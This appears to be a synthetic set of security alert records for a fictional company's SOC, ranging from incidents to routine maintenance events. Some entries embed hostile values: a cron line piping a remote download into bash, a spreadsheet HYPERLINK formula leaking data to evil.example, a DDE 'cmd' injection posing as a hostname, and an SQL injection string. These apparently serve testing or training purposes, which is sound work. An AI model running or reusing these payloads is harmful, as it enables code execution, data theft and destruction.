title: Suspicious process execution detected on prod-web-03
description: Process 'mimikatz.exe' was executed by user 'svc-backup' on host prod-web-03. This binary is commonly associated with credential harvesting attacks. The process was spawned from cmd.exe with parent PID 4012.

title: Brute force attack on SSH — prod-db-01
description: Over 2,400 failed SSH login attempts detected from external IP 203.0.113.89 targeting prod-db-01 within a 5-minute window. Source geo-IP resolves to Eastern Europe. The targeted accounts include root, admin, and postgres.

title: Unusual outbound connection to Tor exit node
description: Host analyst-ws-07 initiated an outbound TCP connection to known Tor exit node 185.220.101.34 on port 9001. The connection was established for 14 minutes and transferred approximately 340MB of data outbound.

title: Ransomware indicator — mass file encryption detected
description: Endpoint detection on prod-file-01 flagged rapid sequential file modifications across 12,000+ files in shared directories. File extensions changed to .locked with ransom note README_DECRYPT.txt dropped in each folder. Process: svchost_update.exe (unsigned).

title: S3 bucket policy changed to public access
description: AWS CloudTrail detected that the bucket policy for s3://penguwave-client-data was modified to allow public read access. The change was made by IAM user 'deploy-bot' from IP 54.231.10.44. This bucket contains customer PII including names, emails, and billing addresses.

title: Ransomware file-encryption behavior on prod-fs-01
description: Mass file rename to .locked extension across the fileserver share; shadow copies deleted.

title: New IAM admin role created outside change window
description: A new IAM role 'emergency-admin-temp' with AdministratorAccess policy was created in AWS account 123456789012. The role was created by user 'jpark@penguwave.io' at 03:30 UTC, well outside the approved change window (09:00-17:00 UTC).

title: PowerShell encoded command execution on WKSTN-042
description: Windows event log captured PowerShell execution with -EncodedCommand flag on workstation WKSTN-042. Decoded payload reveals a reverse shell connecting to 198.51.100.77:4444. Executed under user context 'jsmith@corp.penguwave.io' with elevated privileges.

title: Firewall rule change on edge-fw-02
description:
Rule "allow-inbound" modified: opened ports 443, 8080, 9090 to 0.0.0.0/0.
Change ticket CHG-4471 not found. Review required.

title: Docker exec into production container
description: Kubernetes audit log shows 'kubectl exec -it prod-api-deployment-7f8b9c-x4k2n -- /bin/bash' executed by service account 'ci-deploy'. This is the production API container handling live customer traffic. No approved maintenance window was scheduled.

title: SSH key added to root account on prod-db-01
description: A new SSH public key was appended to /root/.ssh/authorized_keys on prod-db-01. The key fingerprint SHA256:xK9m2... does not match any known employee keys in the inventory. Change was made via direct console access, bypassing the bastion host.

title: MFA bypass — session token reused after expiry
description: Authentication system detected a valid session for user 'cmorales@penguwave.io' using a token that expired 6 hours ago. The session originated from IP 203.0.113.150 (different from the original authentication IP 10.0.10.8). Possible session hijacking or token replay attack.

title: Unsigned binary executed by SYSTEM account
description: An unsigned executable 'svchost_update.exe' was launched under the SYSTEM account on prod-web-02. The binary was dropped in C:\Windows\Temp\ and has no digital signature. VirusTotal hash lookup returned 47/72 detections flagging it as Trojan.GenericKD.

title: Large data transfer to external IP — 2.3GB outbound
description: NetFlow analysis detected a sustained outbound data transfer of 2.3GB from prod-file-01 to external IP 91.234.56.78 over HTTPS (port 443). Transfer occurred between 23:30-00:15 UTC. The destination IP is associated with a known file-sharing service frequently used for data exfiltration.

title: Failed login spike — 47 attempts in 2 minutes
description: Authentication logs show 47 failed login attempts for user 'admin@penguwave.io' within a 2-minute window from IP 203.0.113.89. The attempts used different passwords suggesting a credential stuffing attack. Account was not locked out due to missing lockout policy.

title: User-submitted phishing report ingested
description: Reported subject line: — submitted via the abuse mailbox for triage.

title: DNS tunneling pattern detected from dev-api-01
description: DNS monitoring detected anomalous query patterns from dev-api-01. Over 800 TXT record queries to subdomains of 'data.x4k2n.xyz' in 10 minutes. Query payloads contain base64-encoded strings consistent with dns2tcp or iodine tunneling tools.

title: Port scan detected from internal host 10.0.5.22
description: IDS alert triggered by SYN scan originating from 10.0.5.22 (dev-tools-01) targeting the 10.0.2.0/24 subnet. 1,024 ports scanned across 12 hosts in 45 seconds. Scan pattern matches nmap default SYN scan profile.

title: Brute force attack on SSH — prod-db-01
description: Over 2,400 failed SSH login attempts detected from external IP 203.0.113.89 targeting prod-db-01 within a 5-minute window. Source geo-IP resolves to Eastern Europe. The targeted accounts include root, admin, and postgres.

title: Sensitive file accessed outside business hours
description: File access audit log shows user 'mthompson@penguwave.io' accessed /shared/finance/Q4-2024-revenue.xlsx at 20:15 UTC on a Saturday. This user's role is 'junior-analyst' and they do not have a business justification for accessing financial reports.

title: Unusual database query volume from analyst-ws-07
description: Database audit logs show 4,200 SELECT queries executed against the customers table from analyst-ws-07 in a 30-minute period. Normal baseline for this workstation is ~50 queries/hour. Queries appear to be systematically extracting all customer records page by page.

title: Login from previously unseen country (RU)
description: User 'akovacs@penguwave.io' authenticated successfully from IP 95.173.136.70 which geo-locates to Moscow, Russia. This user's historical login locations are exclusively US-based (New York, San Francisco). No travel request on file.

title: Firewall rule modified — outbound restriction removed
description: Network firewall configuration change detected. Rule 'DENY-OUTBOUND-HIGH-RISK' was disabled by user 'netops-svc' at 07:22 UTC. This rule previously blocked outbound traffic to known malicious IP ranges. No change request ticket found in ServiceNow.

title: Privilege escalation — user added to Domain Admins
description: Active Directory audit log shows user 'temp-contractor-01' was added to the 'Domain Admins' security group by 'helpdesk-svc'. The contractor account was created 2 days ago and is scheduled for a 1-week engagement. Domain Admin access was not part of the approved access request.

title: Suspicious cron job added on prod-web-03
description: A new cron job was registered on prod-web-03 running every 5 minutes: '*/5 * * * * curl -s http://91.234.56.78/beacon | bash'. The job was added to the www-data user's crontab. This pattern is consistent with command-and-control beacon behavior.

title: VPN connection from unmanaged device
description: VPN gateway logged a successful connection from device ID 'UNKNOWN-BYOD-7f3a' using credentials for 'rjohnson@penguwave.io'. The device does not have an MDM agent installed and its OS version (Windows 10 Build 18363) is below the minimum required patch level.

title: Suspicious filename observed in upload scan
description: =HYPERLINK("http://evil.example/?leak="&A1,"invoice") detected as the original filename of an uploaded attachment.

title: API rate limit exceeded — /api/v2/customers endpoint
description: Rate limiting triggered on the /api/v2/customers endpoint. API key 'pk_live_a8f3e2b1' made 15,000 requests in 10 minutes (limit: 1,000/min). Requests originated from IP 104.28.55.12 and appear to be scraping customer data sequentially by ID.

title: Certificate transparency log — unexpected subdomain
description: Certificate Transparency monitoring detected a new TLS certificate issued for 'admin-staging.penguwave.io' by Let's Encrypt. This subdomain is not in the approved DNS inventory and does not resolve to any known infrastructure. Possible shadow IT or attacker-controlled infrastructure.

title: Lateral movement detected — SMB admin share access
description: Windows security event log shows successful authentication to \\prod-file-01\C$ admin share from wkstn-042 using NTLM authentication. The source account 'jsmith' does not have documented admin access to this server. Access pattern suggests pass-the-hash technique.

title: Clock drift detected on ntp-01
description: Event timestamp is far in the future; source host clock may be misconfigured.

title: GitHub repository made public accidentally
description: GitHub audit log shows repository 'penguwave/internal-api-keys' visibility was changed from private to public by user 'dev-intern-02'. The repository contains API keys, database connection strings, and internal service credentials. Visibility was reverted after 23 minutes.

title: Outbound ICMP tunnel detected
description: Network monitoring detected sustained ICMP echo request/reply traffic between dev-tools-01 and external IP 45.33.32.156. Packet payload analysis reveals non-standard data in ICMP payload fields, consistent with icmpsh or similar ICMP tunneling tools. 180MB transferred over 2 hours.

title: Service account password unchanged for 180+ days
description: Password audit scan detected that service account 'svc-backup' has not had its password rotated in 187 days, violating the 90-day rotation policy. This account has read access to all production databases and backup storage. Last password change: 2024-08-15.

title: WAF bypass attempt — SQL injection in User-Agent header
description: Web Application Firewall logged a blocked request to /api/v2/search with SQL injection payload in the User-Agent header: 'Mozilla/5.0' OR 1=1; DROP TABLE users;--'. Source IP 185.143.223.10 has made 340 similar attempts in the last hour targeting different header fields.

title: Anomalous process tree on prod-api-01
description: EDR detected an unusual process chain on prod-api-01: nginx → sh → python3 → curl. The python3 process is running a script from /tmp/.hidden/exfil.py which makes HTTP POST requests to an external endpoint every 30 seconds. Process owner: www-data.

title: Email forwarding rule created to external address
description: Microsoft 365 audit log detected a new inbox forwarding rule created by 'lchen@penguwave.io'. All incoming emails matching 'invoice OR payment OR wire transfer' are being forwarded to external address 'lchen.backup@protonmail.com'. Rule was created via OWA from IP 10.0.10.22.

title: Container image pulled from untrusted registry
description: Kubernetes audit log shows pod 'data-processor-batch-7x2k' was created using image 'docker.io/randomuser123/data-tools:latest' instead of the approved internal registry (registry.penguwave.internal). The image has no vulnerability scan results and was pulled without digest verification.

title: Routine vulnerability scan completed
description: Scheduled weekly vulnerability scan completed for the 10.0.0.0/16 network range. Scan duration: 4 hours 22 minutes. Results: 3 critical, 12 high, 45 medium, 128 low findings. Full report available in the vulnerability management portal.

title: SSL certificate expiring in 14 days — api.penguwave.io
description: Certificate monitoring alert: the TLS certificate for api.penguwave.io expires on 2025-03-03. Certificate was issued by DigiCert and covers *.penguwave.io. Auto-renewal is configured but the last renewal attempt failed due to DNS validation timeout.

title: Endpoint hostname anomaly
description: +cmd|'/C calc'!A0 reported as the NetBIOS name of a newly enrolled device pending review.

title: New device enrolled in MDM
description: A new MacBook Pro (serial: C02ZR3XXMD6T) was enrolled in the MDM platform by user 'newanalyst@penguwave.io'. Device is running macOS 14.3 with FileVault enabled. Compliance check passed: all required security agents are installed.

title: EDR agent updated on workstation fleet
description: Endpoint Detection and Response agent version 4.8.2 was successfully deployed to 142 of 145 workstations. 3 workstations failed to update: wkstn-012 (offline), wkstn-067 (disk full), wkstn-099 (agent service stopped). Retry scheduled for next maintenance window.

title: Backup job completed successfully — prod-db-01
description: Nightly database backup for prod-db-01 completed at 06:15 UTC. Backup size: 12.4GB (compressed). Backup was encrypted with AES-256 and uploaded to s3://penguwave-backups/db/2025-02-18/. Integrity check: SHA256 verified. Retention: 90 days.

title: Orphaned alert from decommissioned sensor
description: Alert ingested with no associated owner; sensor was retired last quarter.

title: Password reset request — standard procedure
description: User 'dkim@penguwave.io' submitted a password reset request via the self-service portal. Identity verified via SMS OTP to registered phone number. New password meets complexity requirements. Previous password was 45 days old.

title: Firewall rule audit — quarterly review completed
description: Quarterly firewall rule review completed for fw-edge-01. 234 rules reviewed, 12 rules flagged as overly permissive, 5 rules marked for removal (associated with decommissioned services). Report submitted to security-team@penguwave.io.

title: Phishing simulation — campaign results
description: Monthly phishing simulation campaign 'February-2025-Invoice' completed. 450 emails sent, 23 users clicked the link (5.1%), 8 users submitted credentials (1.8%). Users who failed have been enrolled in mandatory security awareness training.

title: DNS record change — CNAME updated for staging
description: DNS change detected: staging.penguwave.io CNAME updated from 'staging-old.herokuapp.com' to 'staging-v2.penguwave.cloud'. Change made by 'infra-bot' via Terraform apply. Change request CR-2025-0218 approved by platform-team.

title: Access review completed — Q1 2025
description: Quarterly access review for Q1 2025 completed. 89 user accounts reviewed across 12 systems. 4 accounts flagged for excessive permissions (downgraded), 2 accounts identified as orphaned (disabled). Compliance status: PASS.

title: Log ingestion rate normal — Splunk health check
description: SIEM health check completed. Current log ingestion rate: 2.4GB/day (within normal range of 2.0-3.0GB/day). All log sources reporting: 14/14 active. Indexer cluster health: green. Search head response time: 1.2s average.

title: Scheduled antivirus definition update completed
Antivirus definition update deployed
description: Antivirus definition version 2025.0218.1 deployed to all endpoints via WSUS. 145 of 145 endpoints confirmed updated within 4-hour SLA. No new detections triggered by the updated signatures.

title: New user onboarded — standard provisioning
description: New user account created for 'mwilliams@penguwave.io' (role: analyst, department: Security Operations). Standard access provisioned: VPN, email, SIEM read-only, ticketing system. Manager approval verified from 'jpark@penguwave.io'.

title: Patch Tuesday updates applied — Windows Server fleet
description: February 2025 Patch Tuesday updates applied to 28 Windows Server instances. All patches installed successfully with no reboot failures. Critical patches: KB5034763 (RCE fix), KB5034770 (privilege escalation fix). Next scan scheduled for 2025-02-25.

title: Security awareness training — monthly completion report
description: February security awareness training module 'Social Engineering Tactics' completed by 412 of 450 employees (91.6%). 38 employees have not yet completed the training (deadline: 2025-02-28). Reminder emails sent to non-completers.

title: Network switch firmware updated — core-sw-01
description: Core network switch core-sw-01 firmware updated from v7.2.1 to v7.3.0 during scheduled maintenance window. Update includes fixes for CVE-2024-12345 (LLDP buffer overflow). No service disruption reported. Rollback image preserved.

title: Disaster recovery test — successful failover
description: Quarterly DR test completed successfully. Primary database failover to DR site (us-west-2) completed in 4 minutes 12 seconds (RTO target: 15 minutes). Data loss: 0 transactions (RPO target: <1 minute). All application health checks passed post-failover.

title: SOC shift handover — night to day
description: SOC shift handover completed at 08:30 UTC. Night shift (analyst2) handed over 3 open investigations to day shift (analyst1): EVT-003 (Tor connection), EVT-007 (PowerShell reverse shell), EVT-012 (data exfiltration). No critical incidents pending immediate action.
